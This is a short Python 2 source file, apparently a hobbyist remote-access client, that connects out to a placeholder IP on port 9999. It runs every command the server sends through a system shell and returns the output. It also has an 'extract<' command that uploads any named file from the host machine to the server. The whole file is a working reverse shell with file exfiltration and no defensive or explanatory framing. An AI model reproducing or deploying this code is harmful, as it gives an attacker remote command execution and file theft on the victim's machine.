#!#/usr/bin/python
#client.py
#Author: Willie Cooley
#Description: Connects to a remote host and executes any commands
#       given, within a shell, returns the output of the commands
#       to the server.

import os
import subprocess
import socket

#set up the socket and connect to the server
def establish_conection(h, p, e):
    global host
    global port
    global server
    global exit
    host = h
    port = p
    exit = e
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((host,port))

#navigate to and open the given file, sends out 1024 bytes at a time
def send_file(sckt, path):
    if os.path.exists(path):
        outFile = open(path, 'rb')
        packet = outFile.read(1024)
        while packet != '':
            sckt.send(packet)
            packet = outFile.read(1024)
        sckt.send('TRANSFER COMPLETE')
        outFile.close()
    else:
        sckt.send('File not found')

#runs the commands sent from the server, and returns the output to the server
#special cases for cd and extract< (defined here), and an exit command (user defined)
def accept_commands():
    while True:
        data = server.recv(1024)

        if exit in data:
            server.close()
            break
        elif 'extract<' in data:
            extract,path = data.split('<')
            try:
                send_file(server,path)
            except Exception,e:
                server.send(str(e))
                pass
        elif data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:])
            server.send(os.getcwd())
        else:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            server.send(cmd.stdout.read())
            server.send(cmd.stderr.read())

def client_start():
    establish_conection("XXX.XXX.XXX.XXX", 9999, "XPLACEX")
    accept_commands()

client_start()
